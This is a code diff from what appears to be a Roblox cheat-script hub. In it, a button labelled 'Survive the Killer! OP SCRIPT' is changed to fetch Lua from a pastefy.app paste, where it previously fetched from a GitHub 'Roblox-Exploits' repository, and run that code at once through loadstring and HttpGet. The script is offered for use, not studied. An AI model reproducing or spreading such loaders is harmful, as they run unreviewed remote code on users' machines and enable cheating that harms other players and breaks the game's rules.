@@ -180,7 +180,7 @@ Tab4:AddButton({
 
 Tab4:AddButton({
   Name = "[THE HUNT EVENT] 🔪Survive the Killer! OP SCRIPT",
-  Callback = function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))() end    
+  Callback = function()  loadstring(game:HttpGet(('https://pastefy.app/LOyKaxWe/raw'),true))() end    
 })
 
 Tab:AddButton({
